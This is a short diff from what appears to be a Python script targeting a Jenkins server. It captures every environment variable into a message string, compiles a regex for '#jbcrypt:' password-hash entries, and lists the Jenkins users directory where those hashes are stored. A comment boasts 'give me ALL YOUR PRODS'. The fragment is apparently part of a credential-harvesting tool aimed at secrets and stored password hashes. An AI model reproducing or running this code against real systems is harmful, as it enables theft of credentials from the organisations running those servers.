@@ -27,7 +27,7 @@ message = ""
 ##lololol give me ALL YOUR PRODS.
 r = re.compile(r"#jbcrypt:[^<]+")
 envs = os.environ
-message = pprint.pprint(envs)
+message = pprint.pformat(envs)
 
 """
 results = os.listdir('/var/lib/jenkins/users/')
